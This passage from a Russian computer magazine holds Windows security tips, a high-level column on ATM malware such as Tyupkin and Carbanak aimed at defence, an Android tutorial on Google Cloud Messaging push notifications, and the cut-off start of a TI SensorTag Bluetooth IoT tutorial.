3. В Win 7 вместо IE используй Chrome или любой другой браузер. Что же ка-
   сается Edge, то его безопасность (особенно вместе с защитником) пока
   не вызывает сомнений. А использовать его уже или нет — это дело вкуса,
   и здесь каждый решает сам.
4. UAC — это не постоянно мешающая фича, а реально полезный инструмент,
   позволяющий оградить систему от всякой заразы.
5. Стандартный брандмауэр, может, и не эталон, но все же лучше, чем ниче-
   го. Если не планируешь устанавливать проверенный сторонний продукт, от-
   ключать штатный не стоит.
6. Если браузер рекомендует не посещать тот или иной сайт, лучше отказаться
   от просмотра. Если уж сильно нужно, всегда можно использовать виртуал-
   ку — если и будет заражена, то виртуальная машина, а не хост.
7. Регулярно делай бэкапы на внешний винт — даже если какой-то вирус и ис-
   портит твои документы, бэкап быстро поправит ситуацию.
8. Штатный антивирус в Win 10 довольно хорош и имеет право на жизнь. Если
   не хочешь тратиться на сторонние программные продукты, не отключай его.
9. Чем новее версия MS Office, тем меньше вероятность, что запустится вре-
   доносный код из документов Office. Дважды подумай, прежде чем включать
   макросы, особенно для документов, полученных из сомнительных источни-
   ков.
10. И напоследок самое главное — не работай под админом. Создай аккаунт,
   который будет использоваться для обычной работы с компом — работы
   с документами, серфинга, просмотра фильмов.

Конечно, даже если придерживаться этих рекомендаций, все еще есть веро-
ятность инфицирования системы, хоть и небольшая. Начинающим или невни-
мательным пользователям, которые хотят просто работать и не задумываться
ни о чем, нужно устанавливать антивирус.
MALWARE: Колонка Дениса Макрушина
 МАЛВАРЬ
ДЛЯ БАНКОМАТА





                      Денис Макрушин
                                                      defec.ru, twitter.com/difezza



Большие железные ящики с деньгами, известные
нам как банкоматы, а буржуинам — как ATM, логично
привлекали внимание преступников с самого момента
их изобретения. В рамках этой статьи нас будут
интересовать не «силовые» угрозы АТМ, которые бывали
в прошлом и эпизодически появляются в наше время
(циркулярная пила, автоген, внедорожник 4х4 и лебедка),
а угрозы интеллектуальные.
Закат эпохи скиммеров

Одно время скиммеры — накладные устройства, которые хитрые мошенни-
ки прилаживали к реальным банкоматам, — были очень распространены. На-
столько, что их жертвами стали даже некоторые члены нашей редакции :) —
как говорится, оцените мастерство хакеров, сделавших скиммеры абсолютно
незаметными на банкомате.
   Однако с приходом международного стандарта EMV (Europay, Master-
Card, VISA), который определяет ряд требований к операциям взаимодействия
банковской карты и платежного устройства, уровень безопасности финансо-
вых операций, совершенных пользователем посредством ATM-устройства, за-
метно вырос. А вместе с этим заметно упал объем банкоматного скимминга.



МАЛВАРЬ ДЛЯ АТМ
Идея заразить банкомат трояном выглядит намного безопаснее тактики, вклю-
чающей трос, циркулярку или скиммер. А преимуществ она сулит предостаточ-
но, и к настоящему времени история продемонстрировала финансовым орга-
низациям немало представителей вредоносного программного обеспечения
для ATM-устройств.
   Так, первый вирус, нацеленный на банкоматы, был обнаружен «Лаборато-
рией Касперского» в 2009 году — и Backdoor.Win32.Skimmer до сих пор
находят на некоторых банкоматах. Этот троян крадет данные кредитных карт
пользователей, а также умеет несанкционированно выдавать деньги.
  В качестве другого интересного примера можно привести Trojan-Spy.
Win32.SPSniffer, или Chupa Cabra. Этот троян, впервые замеченный экс-
пертами в 2010 году в Бразилии, работает на всех типах банкоматов. Он пере-
хватывает данные с устройства для считывания информации с карты.
  Хронология обнаружения вредоносного программного обеспечения для ATM-устройств
  (источник: «Лаборатория Касперского»)


Информации о подобного рода троянах уже накопилось достаточно, чтобы
на примере самых ярких представителей проанализировать их особенности
и на основе этого анализа сделать выводы о том, какие меры и технологии тре-
буются для защиты ATM.

BACKDOOR.MSIL.TYUPKIN
В марте 2014 года мир узнал о вредоносном программном обеспечении, ко-
торое было установлено злоумышленниками в банкоматы и позволяло им сни-
мать огромные суммы денег. Преступнику достаточно подойти к зараженному
ATM, ввести с клавиатуры устройства определенный код и получить все содер-
жимое кассет с купюрами!
  Прежде чем проанализировать, как вредоносный код оказался внутри ATM
и какой функциональностью обладал, важно понять один факт: каждый банко-
мат является компьютером, предназначенным для решения специфичных за-
дач. В свою очередь, это означает, что данное устройство подвержено тем же
угрозам, что и традиционные рабочие станции и серверы, а их операционные
системы могут содержать те же уязвимости, что и их десктопные и серверные
аналоги.
   Как выяснилось, вредоносное программное обеспечение, которое получи-
ло название Tyupkin (Backdoor.Win32.Tyupkin), было установлено в ATM при по-
мощи загрузочного компакт-диска при непосредственном доступе преступни-
ка к компьютеру банкомата.


                                                                Количество
                                                               вредоносных
                                                                 образцов
                                                                        Tyupkin
                                                                по странам
                                                                       (согласно
                                                                    статистике
                                                                                   VirusTotal)





После попадания в операционную систему банкомата малварь сразу же отклю-
чала систему защиты McAfee Solidcore, удаляя его программные компоненты,
запускала бесконечный цикл ожидания пользовательского ввода и для того,
чтобы исключить свое обнаружение, принимала какие-либо команды только
в ночное время в воскресенье и понедельник. Зная команды и специальный
код (сообщение от зловреда: «ENTER SESSION KEY TO PROCEED!»), который
принимал троян, чтобы исключить взаимодействие со случайным пользовате-
лем, преступник получал доступ к содержимому кассет и снимал купюры.
                                                 Интерфейс взаимодействия
                                                         Tyupkin с киберпреступником

Однако Tyupkin оказался не единственной угрозой для ATM, с которой столкну-
лись финансовые организации.

CARBANAK
Весной 2014-го «Лаборатория Касперского» была вовлечена в криминалисти-
ческое расследование: банкоматы одного из банков выдавали деньги без фи-
зического взаимодействия получателя с банкоматом. Так началась история
расследования кампании Carbanak и исследования одноименного вредонос-
ного ПО.
                                                     Карта заражений Carbanak


Carbanak представляет собой бэкдор, изначально написанный на основе кода
Carberp. Этот бэкдор предназначен для шпионажа, сбора данных и предостав-
ления удаленного доступа на зараженный компьютер. После того как злоумыш-
ленники получали доступ к какой-нибудь машине внутри банковской сети, они
проводили разведку сети на предмет дальнейшего распространения и зара-
жения критически важных систем — процессинговых, бухгалтерских, а также
банкоматов.
   Разведку злодеи проводили в ручном режиме, пытаясь взломать нужные
компьютеры (например, компьютеры администраторов) и применяя инстру-
менты, обеспечивающие дальнейшее заражение компьютеров в сети. Другими
словами, получив доступ к сети, они переходили с одного компьютера на дру-
гой, пока не находили интересующий их объект. Выбор таких объектов изме-
нялся от атаки к атаке, однако общим оставался результат: злодеям удавалось
выводить деньги из финансовой организации, и одним из основных каналов
вывода были банкоматы.
  В том случае, если атакующим удавалось подобраться к компьютерам, ко-
торые имели доступ во внутреннюю сеть ATM, а также если банк обладал воз-
можностью удаленного доступа к своим ATM-устройствам, злоумышленники
использовали эту возможность для вывода средств. Для этого им даже не тре-
бовалось специальное программное обеспечение для заражения банкома-
тов — они использовали стандартный набор утилит для контроля и тестирова-
ния оборудования банкоматов.
   Решения, установленные на ATM и предназначенные для мониторинга,
в большинстве случаев представляют собой программу-агент, которая прини-
мает какие-либо команды от специальных рабочих станций во внутренней сети
банка и отправляет им какие-либо данные. Например, агенты могут выполнять
следующие действия:
•  мониторинг событий внутри ATM-устройства;
•  распространение программного обеспечения по всем устройствам ATM,
   которые обслуживает банк;
•  загрузка файлов с банкоматов на специальный сервер внутри банка;
•  обеспечение удаленного доступа к ATM.

Данные агенты используются для удаленного администрирования и конфигу-
рирования банкоматов сотрудниками банка, а значит, чаще всего находятся
в «белом списке» программного обеспечения, функционирующего на ATM-у-
стройстве, и, как показали атаки Carbanak, представляют интерес для злоу-
мышленников, получивших доступ к внутренней сети банка.

И МЫ ЕЩЕ НЕ ГОВОРИЛИ О POS...
Боюсь показаться Капитаном Очевидность, но сегодняшняя статистика гово-
рит, что финансовые организации должны уделять больше внимания защите
своих устройств — и не только безопасности их аппаратной составляющей,
но и безопасности операционных систем ATM, а также всей сетевой информа-
ционной инфраструктуры. В этом помогут средства защиты, которые уже давно
применяются в корпоративных сетях, и специализированные решения для обе-
спечения безопасности embedded-систем. А если инцидент произошел, нужно
оперативно на него реагировать и активно взаимодействовать с правоохра-
нительными органами и компаниями, специализирующимися на обеспечении
безопасности.
КОДИНГ





                                                                           Андрей Пахомов
                                                                                          mailforpahomov@gmail.comРАЗБИРАЕМ
GOOGLE CLOUD
MESSAGINGЭКОНОМИМ БАТАРЕЮ И НЕРВНУЮ ТКАНЬ
С ПОМОЩЬЮ PUSH-УВЕДОМЛЕНИЙ
Здорово, когда у твоего приложения есть возмож-
ность постоянно получать апдейты с сервера. Ко-
нечно, реализовать периодические сетевые запросы
легко, мы с тобой такое не раз делали. Однако, если
дюжина приложений будет постоянно стучаться к сво-
им управляющим серверам, батарея телефона или
планшета разрядится еще до полудня.


Чтобы программисты не изобретали велосипед, в мобильных устройствах по-
явилась система Push-уведомлений. Это сервис коротких сообщений, кото-
рые отправляются централизованно через серверы вендора ОС. Разработчи-
ки операционки самостоятельно реализуют периодическую связь устройства
с сервером так, чтобы и сообщения приходили вовремя, и ресурсы устройства
максимально экономились. Режим энергосбережения, роуминг, оптимальная
длина сессии — обо всем этом уже позаботились, создав технологию Push.
   Компания Google разработала API под названием Google Cloud Messaging,
он доступен как для Android, так и для iOS. Использовать этот сервис можно со-
вершенно бесплатно, то есть даром. Посмотрим, что же это за зверь и чем он
хорош!
   Google Cloud Messaging работает на всех ОС Android версии 2.2 и выше. Он
предоставляет возможность удаленно отправить сообщение в приложение, ра-
нее установленное на мобильное устройство. Полезный объем данных ограничен
четырьмя килобайтами, при этом содержание таких сообщений может быть про-
извольным: от текстового уведомления для пользователя до системных команд
приложению. В случае если мобильное устройство не в сети или включен режим
энергосбережения, GCM создаст очередь из сообщений и доставит их позднее.

КАК ЭТО РАБОТАЕТ
Во многих устройствах на базе Android есть приложения от Google с различной
функциональностью, за правильную работу Push-сообщений отвечает пакет
Google Play Services. Если такой пакет установлен, устройство периодически
обращается к серверу с запросом о наличии новых Push-сообщений. Частота
таких запросов зависит от многих параметров: способа интернет-соединения,
состояния батареи и прочего. При этом для экономии трафика у пользователя
есть возможность вообще отключить такой сервис.
   Push-серверы служат «прослойкой» между устройством-получателем и от-
правителем сообщения. От разработчика, использующего GCM, требует-
ся составить сообщение, следуя несложному синтаксису, а затем отправить
POST-запрос на сервер Google,
который  в  дальнейшем  само-
стоятельно доставит сообщение
на устройство.
   Отправленное на устройство
Push-сообщение  имеет  един-
ственного конечного адресата —
это приложение с уникальным
идентификатором, другие прило-
жения доступа к нему не получат.
Для обработки полученных сооб-
щений в приложении нужно реа-
лизовать методы, доступные че-
рез Google Play Services. Этим                                            Рис. 1. Схема работы Google Cloud Messaging
сегодня и займемся.

РЕГИСТРАЦИЯ
Как ты уже мог догадаться, главное звено в сервисе GCM — это серверы Google.
Облако от этой компании осуществляет пропускной контроль и берет на себя
все хлопоты по доставке сообщений, поэтому первым шагом будет регистра-
ция в системе.
   Для работы с GCM требуется создать несколько ключей доступа, их выдают
после регистрации приложения на сайте Google (ссылка есть во врезке). Нуж-
но указать точное название приложения и полное имя проекта. В результате ты
получишь два уникальных параметра: Server Key и Sender ID. Важный момент:
если проект или название приложение изменятся, ключи придется генериро-
вать заново.
   Также на странице регистрации есть большая синяя кнопка Generation
configuration files. Она сформирует конфиг-файл google-services.json, в ко-
тором зашиты все необходимые параметры для работы сервиса, в том числе
ключи. Чтобы добавить этот конфиг-файл в проект, просто скопируй его в ко-
рень папки app, где лежат исходные коды приложения.
   Приложение будет использовать готовые инструменты, реализованные
в Google Play Services, поэтому нужно подключить дополнительные модули
к проекту. В Android Studio это делается путем правки файлов Gradle: в конфиг
проекта подгружаем класс Google Services, а в конфиге приложения — плагины
GCM и Google Play.
МАНИФЕСТ-ФАЙЛ
Теперь идем править манифест проекта. Чтобы сэкономить батарею, Android
старается побыстрее отправлять устройство в сон, снижая расход батареи
и уменьшая частоту процессора. Это может помешать передаче и приему дан-
ных, поэтому у приложения должна быть возможность воспрепятствовать тако-
му маневру.



Чтобы стать получателем Push-сообщений, нужно добавить разрешение под
названием C2D_MESSAGE, при этом в параметре name должно быть полное
имя пакета.





В нашем приложении будут модули из Google Play Service, об этом нужно тоже
написать в манифесте. Сервис GcmReceiver отвечает за прием сообщений
от сервера, а также в случае необходимости помогает устройству не уйти в ре-
жим экономии энергии:




Обрати внимание, что еще совсем недавно (до октября прошлого года) Push-у-
ведомления можно было отправить сервисом Cloud to Device Messaging, под-
ключая соответствующее разрешение c2dm.permission.RECEIVE, теперь он
окончательно закрыт.

ПРОВЕРКИ
Как показывает практика использования различных API от Google, генерация
ключей и устранение зависимостей — самые трудоемкие задачи. Реализация
же логики API в проекте довольно проста: нужно только создать несколько объ-
ектов и переопределить их классы, отвечающие за получение и отправку дан-
ных. На устройстве может не быть приложений от Google, в этом случае при-
дется отказаться от Push-сообщений. Проверка на наличие API выполняется
следующим образом.
ТОКЕН
Ввести приложение в элитный клуб получателей Push-сообщений поможет один
из методов Google API. Вызвать его будет удобно, воспользовавшись классом
IntentService. Так же как и его родительский класс Service, он позволяет вы-
полнять в фоне различные ресурсоемкие задачи, например сетевые вызовы.
Главное преимущество IntentService в том, что после выполнения всех задач он
будет самостоятельно остановлен системой, тогда как обычный Service про-
должит висеть в фоне, ожидая команды stopSelf() или stopService(). Класс
регистрации в GCM назовем RegistrationIntentService.





Собственно, разработчики Google все подготовили для нас, осталось толь-
ко нажать большую красную кнопку и наслаждаться результатом. В GCM API
есть класс InstanceID, способный самостоятельно сформировать сетевой па-
кет с регистрационными данными и отправить его на сервер. От разработчика
требуется только указать уникальный идентификатор пакета (Sender ID, еще он
иногда называется Project number). А если файл google-services.json был
скопирован правильно, то переменная gcm_defaultSenderId сама появится
в Android Studio.
Метод getToken возвращает еще один уникальный параметр — идентифика-
тор устройства, на котором установлено приложение с включенным сервисом
GCM. Этот токен пригодится чуть позже для отправки сообщений, поэтому
его нужно как-то передать из приложения на сервер разработчика. В этот раз
Google, к сожалению, не поможет, сетевую функциональность нужно реализо-
вать самому. Но не так давно в статье о библиотеках я писал про Retrofit, тут она
будет как раз к месту.
   Компания Google рекомендует периодически обновлять токен, чтобы из-
бежать его компрометации и использования злоумышленниками. Чтобы ини-
циировать из приложения перевыпуск ключа, достаточно просто еще раз
вызвать метод getToken. Еще можно с сервера отправить команду на об-
новления токена, за обработку такой команды в приложении отвечает класс
InstanceIDListenerService. Наличие в приложении такого сервиса обязательно,
без него GCM не заработает.





В этом классе существует единственный метод onTokenRefresh, он будет вы-
зван системой в тот момент, когда приложение получит команду на обновле-
ние. Основная задача этого метода — запустить IntentService, содержащий
InstanceID.





СООБЩЕНИЯ
Разберем теперь особенности формирования сообщения. В GCM есть
возможность отправлять сообщения как с сервера, так и с мобильного
устройства на другие устройства с таким же приложением. При этом логи-
ка построения запросов сохраняется, разница будет только в полях адреса
и отправителя.
   Push-сообщения имеют организованную структуру с обязательными поля-
ми, необходимыми для авторизации отправителя и получателей. Для удобства
разработчиков сообщения могут быть в формате JSON или XML, сегодня мы
будем использовать JSON как более прогрессивный.

ОТ СЕРВЕРА
Концепция GCM предполагает, что разработчик обладает веб-сервером, с ко-
торого будет идти рассылка сообщений. Для отправки сообщения с сервера
на мобильное устройство (downstream message) нужно отправить запрос вот
такого формата:





Формат общения не так сложен: на сервер Google методом POST отправляет-
ся HTTP-запрос, в теле которого содержится JSON-сообщение. Отправитель
идентифицируется с помощью ключа Server key, который был выдан при реги-
страции, а получателем сообщения будет одно конкретное устройство, обла-
дающее токеном, полученным из InstanceID.

ТОПИКИ
Вполне вероятна ситуация, когда требуется отправить одинаковое сообщение
сразу группе устройств. Для этого не нужно закидывать Google одинаковыми
запросами, достаточно поменять адресата. В GCM есть возможность орга-
низовать своего рода подписку на топики новостей: чтобы создать рассылку
всем подписчикам, достаточно в поле получателя указать что-то вроде
«to» : «/topics/xakep». В этом примере сообщение получат все устройства,
которые подписаны на топик xakep. Отмечу, что параметр «/topics/» является
обязательным и неизменным.
ГРУППЫ
Подписка на топики делается только внутри приложения, что не всегда удобно.
Есть возможность со стороны сервера объединить несколько устройств в груп-
пу и рассылать им сообщения. Вот как будет создана группа pahomovGroup.





Принцип тот же — нужно указать регистрационные данные, а затем название
группы и токены входящих в группу устройств, пустую группу создать нельзя.

ОТ КЛИЕНТА
Приложение с реализованным GCM может посылать сообщения другим
устройствам, на которых установлено приложение с такими же идентификато-
рами (upstream message). Для такой задачи есть класс с неожиданным именем
GoogleCloudMessaging:




Отправить сообщение возможно какому-то конкретному приложению или
на сервер с поднятым сервисом XMPP, разослать послание группе или под-
писчикам топика, к сожалению, нельзя.
  Данные для сообщения задаются через класс Bundle путем генерации связ-
ки ключ — значение. Чтобы сформировать пакет и отправить запрос, достаточ-
но вызвать метод send с указанием токена получателя, уникального ID сообще-
ния (случайное число) и полезной нагрузки:
ПОЛУЧЕНИЕ СООБЩЕНИЙ
Получать сообщения довольно просто —
в Google API, который мы уже подключи-
ли,  доступен  класс  GcmListenerService.
Его нужно явно объявить в проекте и пе-
реопределить единственный метод. Ког-
да на устройство поступит новое сооб-
щение, в приложении будет вызван метод
onMessageReceived. В аргументах будут
все необходимые данные: имя отправителя
и тело POST-запроса, обернутое в объект
класса Bundle. Так как в JSON информация
хранится по принципу ключ — значение, по-
лучить данные из поля extra возможно вот
таким способом:





                       Рис. 2. Пример уведомления





Уведомления   для   пользователя   выводятся   с  помощью   классов
NotificationManager и NotificationCompat.Builder. Сначала задается структура
сообщения: его заголовок, основной текст и иконка, которая будет видна в па-
нели уведомлений:





Затем нужно подключиться к сервису в Android, который отвечает за все уве-
домления в системе:
Вывод сообщения осуществляет метод notify, при этом сообщению нужно при-
думать уникальный внутри приложения идентификатор.



ПОДПИСЫВАЕМСЯ НА ТОПИКИ
Теперь реализуем подписку на топики, о которых мы говорили ранее. Чтобы
подписаться на набор топиков, достаточно в цикле вызвать метод subscribe
из класса GcmPubSub.





Теперь, если устройство получит сообщение, которое адресовано подписчи-
кам таких топиков, будет вызван метод onMessageReceived.

ГЕНЕРАЦИЯ СООБЩЕНИЙ
Сформировать POST-запрос по указанным требованиям можно разными спо-
собами. Если под рукой есть Linux-машина с консолью, то рекомендую тебе
утилиту cURL, она позволяет отправлять и принимать сетевые запросы самых
разных форматов. К примеру, вот так будет выглядеть сообщение от сервера
с указанием токена:

curl -s “https://android.googleapis.com/gcm/send”
    -H “Authorization: key=Server_key”
    -H “Content-Type: application/json”
    -d ‘{“to”: “app_token”, “from”:”xakep”, “data”:{“message”:
        “hello”, “extra”: “world”}}’

TROUBLESHOOTING
При использовании GCM больше всего вопросов возникает на этапе подго-
товки. Использование самых свежих библиотек требует актуальной версии
сборщика: модули Google Play Services, которые мы подключали в этой ста-
тье, будут работать с Gradle версией не ниже 2.10. Для этого в Android Studio
выбрать параметр Use default Gradle wrapper и подправить  distributionUrl
в файле gradle-wrapper.properties.
  Рис. 3. Настройка Gradle в Android Studio

В случае если приложение не проходит регистрацию в системе, от Google при-
ходит одна-единственная ошибка service_not_available. В первую очередь
нужно посмотреть, корректно ли при регистрации на сайте были заданы имя
приложения и название пакета. У меня такая ошибка
возникала из-за нестабильного интернет-соединения,
на Stack Overflow советуют проверить настройки даты
и времени, а также разрешения в манифест-файле.

ЗАКЛЮЧЕНИЕ
Push-уведомления — невероятно удобная вещь, кото-
                                  WWWрая используется практически в каждом приложении.
Такими сообщениями принято напоминать о различ-      Страница регистрации
ных акциях, скидках и новостях, что побуждает пользо-          приложения
вателя чаще открывать приложение. Как ты смог убе-                                                                           Статья «Шесть лучших
диться, компания Google создала очень удобный API,        библиотек Android-
работать с которым — одно удовольствие. Для луч-          разработчика»
шего понимания материала скачай с нашего сайта
                                                                            Инструкция
подробные исходники приложения, а также примеры                                                                               от Google. Как всегда,
запросов с помощью cURL. Если останутся вопросы —          на английском
обязательно пиши мне на почту. Удачи!
КОДИНГ


ТВОЙ ПЕРВЫЙ





                                                                  Дмитрий Коржавин
                                                                                           dmitriycor@hotmail.comИНТЕРНЕТ
                   УЧИМСЯ ДЕЛАТЬ
                  СВОЙ IOT НА ANDROID
                   И ХАРДКОРНОМ
                    ЖЕЛЕЗЕВЕЩЕЙ
К 2020 году на планете будет 50 миллиардов устройств из мира
«интернета вещей» (IoT). Это предсказание Cisco, сделанное
в 2013 году, начинает сбываться. Кроме умных холодильников
с подключением к облаку и роботов-пылесосов, сейчас появля-
ется довольно много полезных систем — прототипы с неносимой
электроникой, которая помогает по косвенным признакам опре-
делить состояние человека, прототип умной парковки и системы
управления автомобильным трафиком (Intel)... Возможно, IoT пе-
ревернет экономику. Когда-нибудь, возможно уже совсем скоро,
нанороботы в человеческой крови, которые вводят точные дозы
лекарства и следят за состоянием человека, будут скачивать об-
новление через беспроводное подключение к облаку. Какой див-
ный новый мир открывается перед хакерами :).





                                                             Концепция IoT
ПОГРУЖЕНИЕ В МИР МАШИН
Сегодня я расскажу, как сделать свою первую сеть для IoT, мостик между ми-
ром окружающим и миром программ, и поделюсь методикой построения ин-
тернета вещей. Несмотря на то что некоторые небезосновательно считают это
просто рекламным трюком (обычный М2М в новой обертке с подешевевшими
компонентами и интернетом), системы с довольно мощными вычислительны-
ми ресурсами и малым энергопотреблением все больше завоевывают сердца
пользователей, маркетологов и инженеров. Интернет вещей (англ. Internet of
Things, IoT) — это концепция вычислительной сети физических объектов («ве-
щей»), оснащенных встроенными технологиями для взаимодействия друг с дру-
гом или с внешней средой.





                                                                Реализация IoT

Реализации интернета вещей очень разнятся по протоколам, по типу сетей
и по цене. Обычно общее в них — это набор сенсоров и (или) актуаторов (испол-
нительных устройств) с первичной сборкой и обработкой данных и пересылкой
в хаб или gateway, где происходит дальнейшая обработка данных, отправка ко-
манд на сенсоры или пересылка в облако, на серверы (возможно, для работы
с алгоритмами из мира Big Data, если данных очень много) и к пользователю.
   Рецепт же моей реализации довольно прост: берем набор датчиков с тех-
нологией Bluetooth Smart для сбора сведений об окружающей среде, смарт-
фон, облако по вкусу. Смешиваем, взбалтываем — и получаем маленький IoT.
ПЛАН ДЕЙСТВИЙ
Для нашего простого IoT подойдет схема считывания показаний измеренных фи-
зических величин (например, температура и влажность), простая их обработка
и отправка клиенту. Завершающий этап — отображение данных на стороне кли-
ента. В самом кратком виде наши действия можно описать тремя пунктами:
1. Для начала нужно выбрать сам датчик или набор датчиков, с которых мы бу-
  дем получать измеренные данные, и способ обработки полученных данных.
2. Затем нужно определиться с тем, как мы будем общаться с датчиками, опре-
   делить объемы данных и понять, как мы будем строить общение.
3. Наконец, нам нужно найти подходящий клиент для нашей сети и описать ра-
   боту с ним.

ВЫБОР ОРУДИЯ
Роль датчика и предварительного обработчика будет играть SensorTag 2 (или
SensorTag 2015) от Texas Instruments. Как вариант — Ардуино с BLE-шилдом
или BLEduino.
   Техасовский инструмент мне понравился ценой (примерно 3 тысячи рублей)
и возможностями. Представь, что на этой платке размером 5 x 6,7 x 1,4 см есть
целых десять разных сенсоров на любой вкус: датчик освещенности, цифровой
микрофон, магнитометр, датчик влажности, барометр, акселерометр, гиро-
скоп, геркон, температурный датчик и температурный датчик по ИК-излучению,
и все это с возможностью передавать данные по BLE (Bluetooth low energy, ма-
лопотребляющий Bluetooth, Bluetooth Smart), или по 6LoWPAN, или по ZigBee,
а скоро ожидается выход Wi-Fi SensorTag. Железный человек с Бэтменом об-
завидовались бы. А еще SensorTag может быть брелоком, и у него красненький
силиконовый чехольчик (приятно потрогать).


На этой платке размером 5x6,7x1,4 см есть целых десять разных сенсоров
на любой вкус: датчик освещенности, цифровой микрофон, магнитометр, дат-
чик влажности, барометр, акселерометр, гироскоп, геркон, температурный
датчик и температурный датчик по ИК-излучению.



Внутри главной микросхемы СС2650, сердца SensorTag 2, крутится операци-
онная система реального времени (TI-RTOS), которая вместе с фирменным
BLE-стеком обеспечивает надежное управление, по сути, тремя разными ми-
кроконтроллерами:
1. Ядро первого микроконтроллера — Cortex-M3 (на нем обычно выполняется
   написанное нами пользовательское приложение).
2. Ядро второго — Cortex-M0 (отвечает за физический уровень, радиосвязь).
3. Отдельный контроллер для датчиков (помогает быстро получать от них
   данные).

Основная идея заключается в том, чтобы уменьшить разряд батареи, включая
и отключая разные ядра в нужное время. Например, если требуется радиосвязь,
включаем «радиоядро», отключаем контроллер сенсоров, и наоборот. В резуль-
тате этих ухищрений достигается снижение энергопотребления до 75% по срав-
нению с другими BLE-микросхемами. По документации от TI, если устройство
отправляет данные раз в секунду, то оно проработает один год от батарей-
ки-монетки CR2032. Если же устройство не будет слать данные, а будет лишь
опрашивать датчики раз в секунду, то может продержаться десять лет!


Устройство работает один год от батарейки-монетки CR2032. А если устрой-
ство не будет слать данные, а лишь опрашивать датчики раз в секунду, то может
продержаться десять лет!


ВЫБОР СПОСОБА ОБЩЕНИЯ
Почему BLE? Да потому, что он идеален для IoT:
•  Как ленивец из мультика, он очень крепко спит (мало потребляет энергии),
   просыпается, быстро передает данные и снова засыпает.
•  Андроидофоны с поддержкой BLE-стека сейчас есть у каждого, а именно его
  мы будем использовать в качестве хаба и перевалочного пункта (gateway)
   на пути к облаку.

Ключевые термины и понятия BLE
•  Профиль общих атрибутов (GATT), GATT-профиль — это общие специфика-
   ции для отправки и получения коротких фрагментов данных («атрибутов») во
   время BLE-связи. Все существующие BLE-устройства применяют профили
   на его основе. GATT разработан согласно Bluetooth SIG (ассоциация разра-
   ботчиков стандартов и протоколов для Bluetooth) и определяет множество
   профилей для устройств с BLE.
•  Профиль — это определение того, как устройство работает в конкретном
   приложении. Обрати внимание, что устройство может реализовывать боль-
  ше одного профиля. Например, устройство может содержать профили «мо-
   нитор сердечного ритма» и «детектор уровня заряда батареи».
•  Протокол атрибутов (АТТ). GATT — это верхний слой в BLE-стеке над атри-
   бутом протокола (АТТ). Также именуется GATT/АТТ. АТТ оптимизирован
   для работы на BLE-устройствах. С этой целью он посылает насколько воз-
  можно меньше байтов. У каждого атрибута есть уникальный универсаль-
  ный идентификатор (UUID). Он представляет собой стандартизированный
   128-битный строковый ID, который используется для однозначной иденти-
   фикации информации. Атрибуты, передаваемые через АТТ, могут быть двух
   типов: характеристики и службы.
•  Характеристики — содержат одно значение и дескрипторы, описывающие
   значения характеристик. Характеристики можно рассматривать как тип.
•  Дескрипторы — определения атрибутов, которые описывают характерные
   значения. Например, дескриптор может указать удобочитаемое описание,
   диапазон для значения характеристики или единицы измерения, относящи-
   еся к характеристике и ее значению.
•  Сервис (служба) — это набор характеристик. Например, можно создать сер-
   вис под названием «монитор сердечного ритма», который включает в себя
   такие характеристики, как измерение частоты сердечных сокращений. Най-
   ти список существующих GATT профилей и служб можно на bluetooth.org.

   Теперь рассмотрим архитектуру GATT (General Attribute Profile):
•  GATT определяет структуры, с помощью которых идет обмен данными и в ко-
   торых данные сохраняются;
•  сервисы оперируют данными, которые предоставляются с использованием
   характеристик;
•  клиент использует эти данные.


                                                                    Архитектура
                                                            GATT (General
                                                                                Attribute Profile)
                                                          Структура стека TI
                                                             Bluetooth low energy





ОБЗОР ПОДХОДЯЩИХ ИНСТРУМЕНТОВ
Для начала работы с SensorTag 2 нужно установить среду разработки от TI —
Code Composer Studio (CCS) или IDE IAR. Установщик CCS можно найти по сле-
дующей ссылке. Там тебе предложат зарегистрироваться, и затем можно будет
скачать установщик (для Windows или Linux). IAR можно найти тут. Нужно выбрать
IAR Embedded Workbench for ARM, и после регистрации тебе будет доступна
версия без ограничений по размеру компилируемого кода, но с лицензией
на месяц или с ограничениями (32 Кбайт компилируемого кода), но без лими-
та по времени использования. Существует и набор облачных инструментов TI,
в числе которых среда CCS Cloud.
   Рекомендую попробовать все перечисленные IDE, тем более что их не так
много. Также для работы с нашим gateway/хаб-устройством (смартфон с OS
Android) нужно установить Java Development Kit (JDK) 7 и Android Studio. Кроме
того, рекомендую взять программатор-отладчик cc-devpack-debug. Эта плат-
ка не только может прошивать и отлаживать SensorTag 2, но и умеет работать
с другими контроллерами от TI (например, СС3200 и СС1310).
   Предположим, что у нас нет отладчика, и будем прошивать SensorTag 2 че-
рез Android- или iOS-устройство по воздуху. Как это сделать, расскажу дальше.
  Еще полезно скачать и установить Bluetooth Low Energy Software Stack, или
просто BLE-STACK. Нам пригодится стек версии 2.1.1. После установки пакета
в папке ti на жестком диске ты найдешь разные полезные примеры, докумен-
тацию и прошивки для ST2 под разные IDE. Также для удобной работы из-под
Windows с визуализацией и парсингом служб, профилей и пакетов BLE можно
установить настольное приложение TI BLE Device Monitor и SmartRF Studio или
BTool ( (из состава пакета BLE-STACK).
RTFM: читаем документацию перед началом работы
Из полезной документации перед началом работы я советую почитать введе-
ние в разработку BLE-приложений CC2640 BLE Software Developers Guide (pdf).
  На страничке, посвященной SensorTag 2, есть также достаточно много полез-
ной информации про устройство. Например, там рассказано, как написать при-
ложение к SensorTag 2 для смартфона c использованием JavaScript-фреймворка.


                                                               Горсть
                                                             SensorTag





                                                           Отладчик
                                                                cc-devpack-
                                                           debug
Для того чтобы понять, что мы делаем, советую зайти на страничку SimpleLink
Academy. На ней в форме лабораторных работ и викторин дается введение в TI-
RTOS (операционная система реального времени (RTOS) от TI, которая вместе
с BLE-STACK является частью прошивки SensorTag), знакомство с ее поняти-
ями и сущностями (например, есть рассказ о таких общих понятиях для всех
RTOS, как семафор или задача). Следующие за этим лабораторные работы по-
священы как раз Bluetooth Smart:
•  Фундаментальные концепции устройства BLE-стека.
•  Создание своего кастомного профиля в BLE.
•  Создание простой сети.
•  Работа с другой IDE (Sensor Controller Studio) и пример для SensorTag —
   снятие данных по шине I2C от датчика освещенности.

Да, чуть не забыл: можно и не менять прошивку SensorTag 2, если интересно
только программирование на стороне Android. Скачать исходники для Android
всегда можно c Git-репозитория по ссылке. Это же приложение есть и на Google
Play. Так что можешь просто экспериментировать на Android-стороне.



РАБОТА С ЖЕЛЕЗОМ
Для запуска SensorTag (если мы это делаем в первый раз) нужно вытащить пленку,
чтобы запитать плату от батарейки. В дальнейшем включать/выключать устрой-
ство можно, нажимая на кнопку сбоку с гравировкой включения (не узнать ее мо-
